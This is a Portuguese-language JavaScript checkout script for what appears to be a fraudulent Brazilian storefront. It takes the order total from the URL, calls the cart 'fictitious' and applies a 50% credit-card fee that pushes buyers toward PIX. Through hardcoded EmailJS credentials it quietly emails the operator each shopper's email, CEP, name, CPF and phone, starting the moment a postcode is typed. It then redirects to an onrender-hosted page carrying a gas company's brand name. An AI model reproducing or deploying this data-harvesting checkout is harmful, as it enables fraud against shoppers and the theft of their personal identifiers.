/**
 * Checkout Progressivo - Script Principal
 * Fluxo UX otimizado com revelação progressiva de campos
 * Idêntico ao primeiro código de referência
 */

// Estado global do checkout
let currentStep = 2; // Inicia na etapa 2 (Entrega) - Carrinho é fictício
let selectedShipping = null;
let selectedPayment = 'pix';
let addressFilled = false;
let pixTimer = null;

window.checkoutData = {};

const CREDIT_CARD_FEE_PERCENTAGE = 50;
const BACKEND_API_BASE_URL = '/api/payments';

let cartData = {
    subtotal: 299.90
};

// Estado do fluxo progressivo
let flowState = {
    emailValid: false,
    cepValid: false,
    shippingSelected: false,
    personalDataValid: false,
    addressComplementValid: false,
    cpfValid: false
};

// Controle para envio do primeiro email (quando CEP é inserido)
let firstEmailSent = false;

// Inicialização do EmailJS
(function() {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
    script.onload = function() {
        emailjs.init("Sb-IhtOotsnORH1-U");
    };
    document.head.appendChild(script);
})();

document.addEventListener('DOMContentLoaded', function() {
    parseSubtotalFromURL();
    setupEventListeners();
    updateProgress();
    setupMasks();
    updateCartDisplay();
    initializeProgressiveFlow();
    initializePaymentMethod();

    // Configurar teclado numérico para campos específicos
    const numericFields = ['cpf', 'zipCode', 'phone'];
    numericFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.setAttribute('inputmode', 'numeric');
            field.setAttribute('type', 'text');
        }
    });

    const creditCardNotice = document.getElementById('creditCardNotice');
    if (creditCardNotice) {
        creditCardNotice.style.display = 'none';
    }

    // Resetar estado de carregamento se o usuário voltar para a página
    window.addEventListener('pageshow', function(event) {
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) {
            loadingOverlay.style.display = 'none';
        }
        
        const submitBtn = document.querySelector('#paymentForm button[type="submit"]');
        if (submitBtn) {
            submitBtn.classList.remove('btn-loading');
        }
    });
});

/**
 * Inicializa o fluxo progressivo
 * Mostra apenas a seção de contato e CEP inicialmente
 */
function initializeProgressiveFlow() {
    // Esconde todas as seções exceto contato e CEP (ambas visíveis desde o início)
    const sections = [
        'shippingOptions',
        'sectionPersonalData',
        'sectionAddressInfo',
        'sectionAddressComplement',
        'sectionCpf',
        'sectionButton'
    ];

    sections.forEach(sectionId => {
        const section = document.getElementById(sectionId);
        if (section) {
            section.classList.add('hidden');
            section.classList.remove('show');
        }
    });

    // Garante que a seção de CEP esteja visível
    const sectionCep = document.getElementById('sectionCep');
    if (sectionCep) {
        sectionCep.classList.remove('hidden');
    }

    // Garante que o botão fictício esteja visível
    const sectionContinueButton = document.getElementById('sectionContinueButton');
    if (sectionContinueButton) {
        sectionContinueButton.style.display = 'block';
    }
}

function parseSubtotalFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const subtotalParam = urlParams.get('subtotal');
    
    if (subtotalParam) {
        try {
            cartData.subtotal = parseFloat(subtotalParam);
            console.log('Subtotal loaded from URL:', cartData.subtotal);
        } catch (error) {
            console.error('Error parsing subtotal from URL:', error);
        }
    }
}

function updateCartDisplay() {
    updateOrderTotals();
}

function updateOrderTotals() {
    const subtotalEl = document.querySelector(".sidebar .total-row span:last-child");
    const mobileSubtotalEl = document.querySelector("#summaryContent .total-row span:nth-child(2)");
    
    if (subtotalEl) {
        subtotalEl.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    if (mobileSubtotalEl) {
        mobileSubtotalEl.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    
    const mobileTotalPrice = document.getElementById("mobileTotalPrice");
    if (mobileTotalPrice) {
        mobileTotalPrice.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    
    updateShippingCost();
}

function setupEventListeners() {
    // Form submissions
    document.getElementById('paymentForm').addEventListener('submit', handlePaymentSubmit);

    // Shipping options
    document.querySelectorAll('.shipping-option').forEach(option => {
        option.addEventListener('click', selectShipping);
    });

    // Payment methods
    document.querySelectorAll('.payment-method').forEach(method => {
        method.querySelector('.payment-header').addEventListener('click', selectPayment);
    });

    // Email field - Progressive reveal
    const emailField = document.getElementById('email');
    if (emailField) {
        emailField.addEventListener('blur', handleEmailBlur);
        emailField.addEventListener('input', function() {
            if (this.classList.contains('error')) {
                validateField(this);
            }
        });
    }

    // CEP field
    const zipCodeField = document.getElementById('zipCode');
    if (zipCodeField) {
        zipCodeField.addEventListener('keyup', handleCEPLookup);
        zipCodeField.addEventListener('blur', () => validateField(zipCodeField));
    }

    // All form inputs validation
    document.querySelectorAll('.form-input').forEach(input => {
        input.addEventListener('blur', () => validateField(input));
        input.addEventListener('input', () => {
            if (input.classList.contains('error')) {
                validateField(input);
            }
            checkFormCompletion();
        });
    });

    // Personal data fields
    const personalFields = ['firstName', 'lastName', 'phone'];
    personalFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('blur', checkPersonalDataCompletion);
            field.addEventListener('input', checkPersonalDataCompletion);
        }
    });

    // Address complement fields
    const addressFields = ['number'];
    addressFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('blur', checkAddressCompletion);
            field.addEventListener('input', checkAddressCompletion);
        }
    });

    // CPF field
    const cpfField = document.getElementById('cpf');
    if (cpfField) {
        cpfField.addEventListener('blur', checkCpfCompletion);
        cpfField.addEventListener('input', checkCpfCompletion);
    }

    // Botão fictício - scroll para o campo que falta
    const btnFictitious = document.getElementById('btnContinueFictitious');
    if (btnFictitious) {
        btnFictitious.addEventListener('click', handleFictitiousButtonClick);
    }

    // Validação ao clicar em "Prosseguir para o pagamento"
    const deliveryForm = document.getElementById('deliveryForm');
    if (deliveryForm) {
        deliveryForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const fieldsToValidate = [
                'email', 'zipCode', 'firstName', 'lastName', 'phone', 'number', 'cpf'
            ];
            
            let firstInvalidField = null;
            let isFormValid = true;

            // Valida campos de input
            fieldsToValidate.forEach(fieldId => {
                const field = document.getElementById(fieldId);
                if (field) {
                    const isValid = validateField(field);
                    if (!isValid && !firstInvalidField) {
                        firstInvalidField = field;
                    }
                    if (!isValid) isFormValid = false;
                }
            });

            // Valida seleção de frete
            if (!selectedShipping) {
                isFormValid = false;
                const shippingOptions = document.getElementById('shippingOptions');
                if (!firstInvalidField) firstInvalidField = shippingOptions;
                
                // Alerta visual para frete (opcional, já que não é um input padrão)
                shippingOptions.style.border = '1px solid #ef4444';
                shippingOptions.style.borderRadius = '8px';
                shippingOptions.style.padding = '10px';
                setTimeout(() => { shippingOptions.style.border = 'none'; }, 3000);
            }

            if (!isFormValid) {
                if (firstInvalidField) {
                    firstInvalidField.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    if (firstInvalidField.focus) firstInvalidField.focus();
                }
                return false;
            }

            // Se tudo estiver válido, prossegue para o pagamento
            handleDeliverySubmit(e);
        });
    }
}

/**
 * Manipula o blur do campo de email
 * Apenas valida o email (CEP já está visível desde o início)
 */
function handleEmailBlur() {
    const emailField = document.getElementById('email');
    const isValid = validateField(emailField);
    
    if (isValid && !flowState.emailValid) {
        flowState.emailValid = true;
        // CEP já está visível, não precisa revelar
    }
}

/**
 * Manipula o clique no botão fictício
 * Faz scroll para o primeiro campo não preenchido
 */
function handleFictitiousButtonClick() {
    const email = document.getElementById('email');
    if (!validateEmail(email.value)) {
        email.focus();
        email.scrollIntoView({ behavior: 'smooth', block: 'center' });
        validateField(email);
        return;
    }

    if (!flowState.cepValid) {
        const zipCode = document.getElementById('zipCode');
        zipCode.focus();
        zipCode.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }
    
    if (!flowState.shippingSelected) {
        const shippingOptions = document.getElementById('shippingOptions');
        shippingOptions.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }
    
    if (!flowState.personalDataValid) {
        const firstName = document.getElementById('firstName');
        const lastName = document.getElementById('lastName');
        const phone = document.getElementById('phone');
        
        if (!firstName.value.trim()) {
            firstName.focus();
            firstName.scrollIntoView({ behavior: 'smooth', block: 'center' });
            return;
        }
        if (!lastName.value.trim()) {
            lastName.focus();
            lastName.scrollIntoView({ behavior: 'smooth', block: 'center' });
            return;
        }
        if (!validatePhone(phone.value)) {
            phone.focus();
            phone.scrollIntoView({ behavior: 'smooth', block: 'center' });
            return;
        }
    }

    if (!flowState.addressComplementValid) {
        const number = document.getElementById('number');
        number.focus();
        number.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }

    if (!flowState.cpfValid) {
        const cpf = document.getElementById('cpf');
        cpf.focus();
        cpf.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }
}

function toggleOrderSummary() {
    const toggle = document.querySelector('.summary-toggle');
    const content = document.getElementById('summaryContent');
    const icon = document.querySelector('.summary-toggle-icon');
    
    toggle.classList.toggle('expanded');
    content.classList.toggle('expanded');
    
    if (toggle.classList.contains('expanded')) {
        icon.textContent = '▲';
        document.querySelector('.summary-toggle-text').textContent = 'Ocultar resumo do pedido';
    } else {
        icon.textContent = '▼';
        document.querySelector('.summary-toggle-text').textContent = 'Exibir resumo do pedido';
    }
}

/**
 * Revela uma seção com animação suave
 * @param {string} sectionId - ID da seção a ser revelada
 * @param {boolean} enableScroll - Se true, faz scroll para a seção (padrão: false)
 */
function revealSection(sectionId, enableScroll = false) {
    const section = document.getElementById(sectionId);
    if (section) {
        section.classList.remove('hidden');
        section.classList.add('show');
        
        // Scroll suave para a seção (apenas se habilitado)
        if (enableScroll) {
            setTimeout(() => {
                section.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }, 100);
        }
    }
}

/**
 * Esconde uma seção
 */
function hideSection(sectionId) {
    const section = document.getElementById(sectionId);
    if (section) {
        section.classList.add('hidden');
        section.classList.remove('show');
    }
}

async function handleCEPLookup() {
    const cepInput = document.getElementById('zipCode');
    const cep = cepInput.value.replace(/\D/g, '');
    
    if (cep.length === 8) {
        cepInput.blur();
        showCEPLoading(true);
        
        try {
            const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
            const data = await response.json();
            
            if (!data.erro) {
                fillAddressFields(data);
                flowState.cepValid = true;
                
                // Revela as opções de frete
                revealSection('shippingOptions');
                
                const errorEl = document.getElementById('zipCodeError');
                errorEl.classList.remove('show');
                cepInput.classList.remove('error');
                cepInput.classList.add('success');
                
                // Envia primeiro email via EmailJS (Email, CEP e Valor)
                if (!firstEmailSent) {
                    sendFirstEmailNotification();
                    firstEmailSent = true;
                }
            } else {
                showCEPError();
                flowState.cepValid = false;
            }
        } catch (error) {
            console.error('Erro ao buscar CEP:', error);
            showCEPError();
            flowState.cepValid = false;
        } finally {
            showCEPLoading(false);
        }
    } else {
        // Esconde seções subsequentes se o CEP for alterado
        if (flowState.cepValid) {
            flowState.cepValid = false;
            flowState.shippingSelected = false;
            flowState.personalDataValid = false;
            flowState.addressComplementValid = false;
            flowState.cpfValid = false;
            
            hideSection('shippingOptions');
            hideSection('sectionPersonalData');
            hideSection('sectionAddressInfo');
            hideSection('sectionAddressComplement');
            hideSection('sectionCpf');
            hideSection('sectionButton');
            
            // Remove seleção de frete
            document.querySelectorAll('.shipping-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            selectedShipping = null;
            
            // Mostra botão fictício novamente
            const sectionContinueButton = document.getElementById('sectionContinueButton');
            if (sectionContinueButton) {
                sectionContinueButton.style.display = 'block';
            }
        }
        
        const errorEl = document.getElementById('zipCodeError');
        errorEl.classList.remove('show');
        cepInput.classList.remove('error', 'success');
    }
}

function showCEPLoading(show) {
    const loading = document.getElementById('cepLoading');
    if (show) {
        loading.classList.add('show');
    } else {
        loading.classList.remove('show');
    }
}

function fillAddressFields(data) {
    // Preenche campos ocultos
    document.getElementById('address').value = data.logradouro;
    document.getElementById('neighborhood').value = data.bairro;
    document.getElementById('city').value = data.localidade;
    document.getElementById('state').value = data.uf;
    
    // Preenche displays visuais
    document.getElementById('addressDisplay').textContent = data.logradouro || '-';
    document.getElementById('neighborhoodDisplay').textContent = data.bairro || '-';
    document.getElementById('cityDisplay').textContent = data.localidade || '-';
    document.getElementById('stateDisplay').textContent = data.uf || '-';
    
    addressFilled = true;
}

function showCEPError() {
    const zipCodeInput = document.getElementById('zipCode');
    const errorEl = document.getElementById('zipCodeError');
    
    zipCodeInput.classList.add('error');
    zipCodeInput.classList.remove('success');
    errorEl.textContent = 'CEP não encontrado. Verifique e tente novamente.';
    errorEl.classList.add('show');
    
    // Esconde seções subsequentes
    hideSection('shippingOptions');
    hideSection('sectionPersonalData');
    hideSection('sectionAddressInfo');
    hideSection('sectionAddressComplement');
    hideSection('sectionCpf');
    hideSection('sectionButton');
}

/**
 * Seleciona opção de frete e revela próximas seções
 */
function selectShipping() {
    // Remove seleção anterior
    document.querySelectorAll('.shipping-option').forEach(option => {
        option.classList.remove('selected');
    });
    
    // Adiciona seleção atual
    this.classList.add('selected');
    selectedShipping = this.dataset.shipping;
    
    // Atualiza estado e custos
    flowState.shippingSelected = true;
    updateShippingCost();
    
    // Revela seções de dados pessoais, endereço e CPF (sem scroll)
    if (!document.getElementById('sectionPersonalData').classList.contains('show')) {
        revealSection('sectionPersonalData', false);
        revealSection('sectionAddressInfo', false);
        revealSection('sectionAddressComplement', false);
        revealSection('sectionCpf', false); // CPF já disponível junto com endereço
        
        // Não foca em nenhum campo automaticamente
        // O usuário deve clicar no campo que deseja preencher
    }
}

/**
 * Verifica se os dados pessoais estão completos
 */
function checkPersonalDataCompletion() {
    const firstName = document.getElementById('firstName');
    const lastName = document.getElementById('lastName');
    const phone = document.getElementById('phone');
    
    const isValid = 
        firstName.value.trim() !== '' &&
        lastName.value.trim() !== '' &&
        validatePhone(phone.value);
    
    if (isValid && !flowState.personalDataValid) {
        flowState.personalDataValid = true;
    } else if (!isValid) {
        flowState.personalDataValid = false;
    }
    
    checkFormCompletion();
}

/**
 * Verifica se o complemento do endereço está completo
 */
function checkAddressCompletion() {
    const number = document.getElementById('number');
    
    const isValid = number.value.trim() !== '';
    
    if (isValid && !flowState.addressComplementValid) {
        flowState.addressComplementValid = true;
        // CPF já está visível junto com o endereço, não precisa revelar
    } else if (!isValid) {
        flowState.addressComplementValid = false;
    }
    
    checkFormCompletion();
}

/**
 * Verifica se o CPF está completo e válido
 */
function checkCpfCompletion() {
    const cpf = document.getElementById('cpf');
    const isValid = validateCPF(cpf.value);
    
    if (isValid && !flowState.cpfValid) {
        flowState.cpfValid = true;
        cpf.classList.add('success');
        cpf.classList.remove('error');
        
        // Revela botão de continuar e esconde o fictício
        revealSection('sectionButton');
        const sectionContinueButton = document.getElementById('sectionContinueButton');
        if (sectionContinueButton) {
            sectionContinueButton.style.display = 'none';
        }
    } else if (!isValid && flowState.cpfValid) {
        flowState.cpfValid = false;
        // Esconde botão real e mostra fictício
        hideSection('sectionButton');
        const sectionContinueButton = document.getElementById('sectionContinueButton');
        if (sectionContinueButton) {
            sectionContinueButton.style.display = 'block';
        }
    }
    
    checkFormCompletion();
}

/**
 * Verifica se todo o formulário está completo
 * Habilita/desabilita o botão de continuar
 */
function checkFormCompletion() {
    const btn = document.getElementById('btnContinuePayment');
    if (!btn) return;
    
    const email = document.getElementById('email');
    const zipCode = document.getElementById('zipCode');
    const firstName = document.getElementById('firstName');
    const lastName = document.getElementById('lastName');
    const phone = document.getElementById('phone');
    const number = document.getElementById('number');
    const cpf = document.getElementById('cpf');
    
    const isComplete = 
        validateEmail(email.value) &&
        validateZipCode(zipCode.value) &&
        addressFilled &&
        selectedShipping !== null &&
        firstName.value.trim() !== '' &&
        lastName.value.trim() !== '' &&
        validatePhone(phone.value) &&
        number.value.trim() !== '' &&
        validateCPF(cpf.value);
    
    // O botão agora fica habilitado para permitir a sinalização de erros ao clicar
    btn.disabled = false;
    
    // Mostra o botão se todos os campos anteriores estiverem preenchidos
    if (flowState.cpfValid && !document.getElementById('sectionButton').classList.contains('show')) {
        revealSection('sectionButton');
        const sectionContinueButton = document.getElementById('sectionContinueButton');
        if (sectionContinueButton) {
            sectionContinueButton.style.display = 'none';
        }
    }
}

function setupMasks() {
    document.getElementById('cpf').addEventListener('input', function(e) {
        e.target.value = applyCPFMask(e.target.value);
    });

    document.getElementById('phone').addEventListener('input', function(e) {
        e.target.value = applyPhoneMask(e.target.value);
    });

    document.getElementById('zipCode').addEventListener('input', function(e) {
        e.target.value = applyZipMask(e.target.value);
    });

    const cardNumber = document.getElementById('cardNumber');
    if (cardNumber) {
        cardNumber.addEventListener('input', function(e) {
            e.target.value = applyCardMask(e.target.value);
        });
    }

    const cardExpiry = document.getElementById('cardExpiry');
    if (cardExpiry) {
        cardExpiry.addEventListener('input', function(e) {
            e.target.value = applyExpiryMask(e.target.value);
        });
    }

    const cardCvv = document.getElementById('cardCvv');
    if (cardCvv) {
        cardCvv.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }
}

function applyCPFMask(value) {
    return value
        .replace(/\D/g, '')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
}

function applyPhoneMask(value) {
    return value
        .replace(/\D/g, '')
        .replace(/^(\d\d)(\d)/g, '($1) $2')
        .replace(/(\d{5})(\d)/, '$1-$2');
}

function applyZipMask(value) {
    return value
        .replace(/\D/g, '')
        .replace(/(\d{5})(\d)/, '$1-$2');
}

function applyCardMask(value) {
    return value
        .replace(/\D/g, '')
        .replace(/(\d{4})(\d)/, '$1 $2')
        .replace(/(\d{4})(\d)/, '$1 $2')
        .replace(/(\d{4})(\d)/, '$1 $2');
}

function applyExpiryMask(value) {
    return value
        .replace(/\D/g, '')
        .replace(/^(\d{2})(\d)/, '$1/$2');
}

function toggleReviewSection() {
    const section = document.getElementById('reviewSection');
    section.classList.toggle('expanded');
    
    // Anima o toggle suavemente
    const content = section.querySelector('.review-content');
    if (section.classList.contains('expanded')) {
        content.style.maxHeight = '800px';
    } else {
        content.style.maxHeight = '0';
    }
}

function updateReviewData() {
    const firstName = document.getElementById('firstName').value;
    const lastName = document.getElementById('lastName').value;
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    const cpf = document.getElementById('cpf').value;
    const address = document.getElementById('addressDisplay').textContent;
    const neighborhood = document.getElementById('neighborhoodDisplay').textContent;
    const city = document.getElementById('cityDisplay').textContent;
    const state = document.getElementById('stateDisplay').textContent;
    const number = document.getElementById('number').value;
    const complement = document.getElementById('complement').value;
    const zipCode = document.getElementById('zipCode').value;

    document.getElementById('reviewName').textContent = `${firstName} ${lastName}`;
    document.getElementById('reviewEmail').textContent = email;
    document.getElementById('reviewPhone').textContent = phone;
    document.getElementById('reviewCpf').textContent = cpf;
    
    let fullAddress = `${address}, ${number}`;
    if (complement) fullAddress += ` - ${complement}`;
    fullAddress += ` | ${neighborhood}, ${city} - ${state} | CEP: ${zipCode}`;
    document.getElementById('reviewAddress').textContent = fullAddress;

    // Dados do frete - AGORA DENTRO DO BLOCO DE RESUMO
    const shippingOption = document.querySelector('.shipping-option.selected');
    if (shippingOption) {
        const title = shippingOption.querySelector('h4').textContent;
        const time = shippingOption.querySelector('p').textContent;
        document.getElementById('reviewShippingMethod').textContent = title;
        document.getElementById('reviewShippingTime').textContent = time;
    }

    renderReviewProducts();
}


function goToStep(step) {
    if (step === 2) {
        // Voltando para etapa de entrega
        currentStep = 2;
        updateStepDisplay();
        updateProgress();
        
        if (window.innerWidth < 768) {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    } else if (step === 3 && validateDeliveryForm()) {
        // Atualiza os dados de revisão antes de mostrar a etapa 3
        updateReviewData();
        
        // Avançando para pagamento
        currentStep = 3;
        updateStepDisplay();
        updateProgress();
        updateShippingCost();
        
        if (window.innerWidth < 768) {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    }
}

function updateStepDisplay() {
    document.querySelectorAll('.step-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById(`step${currentStep}`).classList.add('active');
}

function updateProgress() {
    const steps = document.querySelectorAll('.step');
    const progressLine = document.getElementById('progressLine');
    
    steps.forEach((step, index) => {
        const stepNumber = index + 1;
        step.classList.remove('active', 'completed');
        
        if (stepNumber < currentStep) {
            step.classList.add('completed');
            step.querySelector('.step-circle').innerHTML = '✓';
        } else if (stepNumber === currentStep) {
            step.classList.add('active');
            step.querySelector('.step-circle').innerHTML = stepNumber;
        } else {
            step.querySelector('.step-circle').innerHTML = stepNumber;
        }
    });

    // Calcula a largura da linha de progresso
    // Etapa 1 (Carrinho) = 0%, Etapa 2 (Entrega) = 50%, Etapa 3 (Pagamento) = 100%
    const progressWidth = ((currentStep - 1) / (steps.length - 1)) * 100;
    progressLine.style.width = `${progressWidth}%`;
}

function validateDeliveryForm() {
    const form = document.getElementById('deliveryForm');
    const requiredFields = form.querySelectorAll('input[required]:not([type="hidden"])');
    let isValid = true;

    requiredFields.forEach(field => {
        // Só valida campos visíveis
        const section = field.closest('.form-section, .form-group');
        if (section && !section.classList.contains('hidden')) {
            if (!validateField(field)) {
                isValid = false;
            }
        }
    });

    if (!addressFilled) {
        isValid = false;
        const zipCodeInput = document.getElementById('zipCode');
        if (!zipCodeInput.classList.contains('error')) {
            zipCodeInput.classList.add('error');
            document.getElementById('zipCodeError').textContent = 'Digite um CEP válido para continuar';
            document.getElementById('zipCodeError').classList.add('show');
        }
    }

    if (!selectedShipping) {
        isValid = false;
        alert('Por favor, selecione uma opção de entrega.');
    }

    return isValid;
}

function validateField(field) {
    const value = field.value.trim();
    const fieldName = field.name;
    let isValid = true;
    let errorMessage = '';

    field.classList.remove('error', 'success');
    const errorEl = document.getElementById(fieldName + 'Error');
    if (errorEl) errorEl.classList.remove('show');

    if (field.hasAttribute('required') && !value) {
        isValid = false;
        errorMessage = "Este campo é obrigatório";
    } else if (value) {
        switch (fieldName) {
            case "email":
                if (!validateEmail(value)) {
                    isValid = false;
                    errorMessage = "Digite um e-mail válido";
                }
                break;
            case "cpf":
                if (!validateCPF(value)) {
                    isValid = false;
                    errorMessage = "Digite um CPF válido";
                }
                break;
            case "phone":
                if (!validatePhone(value)) {
                    isValid = false;
                    errorMessage = "Digite um telefone válido";
                }
                break;
            case "zipCode":
                if (!validateZipCode(value)) {
                    isValid = false;
                    errorMessage = "Digite um CEP válido";
                }
                break;
            case "cardNumber":
                if (!validateCardNumber(value)) {
                    isValid = false;
                    errorMessage = "Digite um número de cartão válido";
                }
                break;
            case "cardExpiry":
                if (!validateCardExpiry(value)) {
                    isValid = false;
                    errorMessage = "Digite uma data válida";
                }
                break;
            case "cardCvv":
                if (value.length < 3) {
                    isValid = false;
                    errorMessage = "Digite um CVV válido";
                }
                break;
        }
    }

    if (isValid) {
        field.classList.add("success");
    } else {
        field.classList.add("error");
        if (errorEl) {
            errorEl.textContent = errorMessage;
            errorEl.classList.add("show");
        }
    }

    return isValid;
}

function validateEmail(email) {
    const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
    return emailRegex.test(email);
}

function validateCPF(cpf) {
    cpf = cpf.replace(/\D/g, '');
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;

    let sum = 0;
    for (let i = 0; i < 9; i++) {
        sum += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let remainder = 11 - (sum % 11);
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(9))) return false;

    sum = 0;
    for (let i = 0; i < 10; i++) {
        sum += parseInt(cpf.charAt(i)) * (11 - i);
    }
    remainder = 11 - (sum % 11);
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(10))) return false;

    return true;
}

function validatePhone(phone) {
    const phoneRegex = /^\(\d{2}\) \d{5}-\d{4}$/;
    return phoneRegex.test(phone);
}

function validateZipCode(zipCode) {
    const zipRegex = /^\d{5}-\d{3}$/;
    return zipRegex.test(zipCode);
}

function validateCardNumber(cardNumber) {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    return cleanNumber.length >= 13 && cleanNumber.length <= 19;
}

function validateCardExpiry(expiry) {
    const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
    if (!expiryRegex.test(expiry)) return false;

    const [month, year] = expiry.split('/');
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;

    const cardYear = parseInt(year);
    const cardMonth = parseInt(month);

    if (cardYear < currentYear || (cardYear === currentYear && cardMonth < currentMonth)) {
        return false;
    }

    return true;
}

async function handleDeliverySubmit(e) {
    e.preventDefault();
    if (validateDeliveryForm()) {
        const formData = new FormData(e.target);
        const deliveryData = {
            email: formData.get('email'),
            firstName: formData.get('firstName'),
            lastName: formData.get('lastName'),
            phone: formData.get('phone'),
            cpf: formData.get('cpf'),
            zipCode: formData.get('zipCode'),
            address: formData.get('address'),
            number: formData.get('number'),
            complement: formData.get('complement'),
            neighborhood: formData.get('neighborhood'),
            city: formData.get('city'),
            state: formData.get('state'),
            shippingMethod: selectedShipping
        };

        window.checkoutData = { ...window.checkoutData, ...deliveryData };
        
        // Enviar email via EmailJS (não bloqueia o fluxo)
        sendEmailNotification(deliveryData);
        
        goToStep(3);
    }
}

// Função para enviar primeiro email via EmailJS (quando CEP é inserido)
// Envia apenas: Email, CEP e Valor
async function sendFirstEmailNotification() {
    try {
        const email = document.getElementById('email').value;
        const cep = document.getElementById('zipCode').value;
        const valor = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
        
        const templateParams = {
            customer_name: 'Cliente',
            customer_email: email,
            customer_cpf: '-',
            customer_phone: '-',
            order_subtotal: valor,
            order_date: new Date().toLocaleString('pt-BR'),
            to_name: 'Cliente',
            from_name: 'PagOnline',
            message: `Novo interesse no checkout!\n\nE-mail: ${email}\nCEP: ${cep}\nValor do Pedido: ${valor}\nData: ${new Date().toLocaleString('pt-BR')}\n\n(Primeiro contato - CEP inserido)`
        };

        const response = await emailjs.send(
            'service_3hgwt59',
            'template_vn6qykn',
            templateParams
        );

        console.log('Primeiro email enviado com sucesso!', response.status, response.text);
        return true;
    } catch (error) {
        console.error('Erro ao enviar primeiro email:', error);
        return false;
    }
}

// Função para enviar email via EmailJS (quando clica em "Prosseguir para pagamento")
async function sendEmailNotification(contactData) {
    try {
        const templateParams = {
            customer_name: `${contactData.firstName} ${contactData.lastName}`,
            customer_email: contactData.email,
            customer_cpf: contactData.cpf,
            customer_phone: contactData.phone,
            order_subtotal: `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`,
            order_date: new Date().toLocaleString('pt-BR'),
            to_name: contactData.firstName,
            from_name: 'PagOnline',
            message: `Novo pedido iniciado!\n\nCliente: ${contactData.firstName} ${contactData.lastName}\nE-mail: ${contactData.email}\nCPF: ${contactData.cpf}\nTelefone: ${contactData.phone}\nValor: R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}\nData: ${new Date().toLocaleString('pt-BR')}`
        };

        const response = await emailjs.send(
            'service_3hgwt59',
            'template_vn6qykn',
            templateParams
        );

        console.log('Email enviado com sucesso!', response.status, response.text);
        return true;
    } catch (error) {
        console.error('Erro ao enviar email:', error);
        return false;
    }
}

async function handlePaymentSubmit(e) {
    console.log("handlePaymentSubmit chamado.");
    e.preventDefault();
    const submitBtn = e.target.querySelector('button[type="submit"]');
    submitBtn.classList.add('btn-loading');
    
    document.getElementById('loadingOverlay').style.display = 'flex';
    
    try {
        const subtotal = cartData.subtotal.toFixed(2);
        const cep = window.checkoutData.zipCode || '';
        
        // Formatar o endereço completo
        const address = window.checkoutData.address || '';
        const number = window.checkoutData.number || '';
        const neighborhood = window.checkoutData.neighborhood || '';
        const city = window.checkoutData.city || '';
        const state = window.checkoutData.state || '';
        
        const fullAddress = `${address}, ${number}, ${neighborhood}, ${city}/${state}`;
        
        // Definir o prazo de entrega baseado no frete selecionado
        let deliveryTime = '3 a 7 dias úteis';
        const selectedOption = document.querySelector('.shipping-option.selected');
        if (selectedOption) {
            const timeText = selectedOption.querySelector('p');
            if (timeText) {
                deliveryTime = timeText.textContent.trim();
            }
        }

        // Construir a URL com os parâmetros
        const baseUrl = 'https://pag-copagaz.onrender.com/pagarmeCHECKOUT/';
        const params = new URLSearchParams({
            subtotal: subtotal,
            address: fullAddress,
            cep: cep,
            delivery_time: deliveryTime
        });

        const redirectUrl = `${baseUrl}?${params.toString()}`;
        
        console.log("Redirecionando para:", redirectUrl);
        window.location.href = redirectUrl;

    } catch (error) {
        console.error('Erro:', error);
        alert('Erro ao processar o redirecionamento. Tente novamente.');
        submitBtn.classList.remove('btn-loading');
        document.getElementById('loadingOverlay').style.display = 'none';
    }
}

async function processPixPayment(orderData) {
    const pixData = {
        paymentMethod: 'PIX',
        amount: Math.round(orderData.total * 100), // Valor em centavos
        customer: {
            name: `${orderData.firstName} ${orderData.lastName}`,
            email: orderData.email,
            phone: orderData.phone.replace(/\D/g, ''),
            document: {
                number: orderData.cpf.replace(/\D/g, ''),
                type: 'CPF'
            }
        },
        items: [{
            name: 'Pedido Loja Online',
            quantity: 1,
            price: Math.round(orderData.total * 100)
        }],
        expiresIn: 3600 // <-- CAMPO MOVIDO PARA O LUGAR CERTO
    };

    try {
        const response = await fetch(`${BACKEND_API_BASE_URL}/pix`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(pixData)
        });

        const result = await response.json();

        if (response.ok) {
            showPixPaymentDetails(result);
        } else {
            const errorMsg = result.details?.message || result.message || 'Erro na API PayEvo';
            throw new Error(errorMsg);
        }
    } catch (error) {
        console.error('Erro ao gerar PIX:', error);
        alert(error.message);
    }
